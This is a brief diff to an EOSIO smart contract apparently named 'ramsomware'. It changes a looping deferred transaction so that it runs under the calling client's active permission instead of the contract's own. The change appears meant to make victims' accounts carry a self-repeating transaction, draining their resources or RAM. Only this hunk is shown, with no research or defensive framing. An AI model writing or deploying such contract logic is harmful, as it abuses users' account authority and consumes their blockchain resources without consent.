@@ -89,7 +89,7 @@ class [[eosio::contract]] ramsomware: public contract{
             printf("SUCCESS SAVE\n");
         }
         transaction out1{};
-        out1.actions.emplace_back(permission_level{_self, "active"_n}, _self , "main"_n, std::make_tuple(client, uint64_t(idx+1), uint64_t(randNum)));
+        out1.actions.emplace_back(permission_level{client, "active"_n}, _self , "main"_n, std::make_tuple(client, uint64_t(idx+1), uint64_t(randNum)));
 	    out1.send(idx+1, "loop"_n, false);
         print("[#] loop  : %d \n ", idx);
 
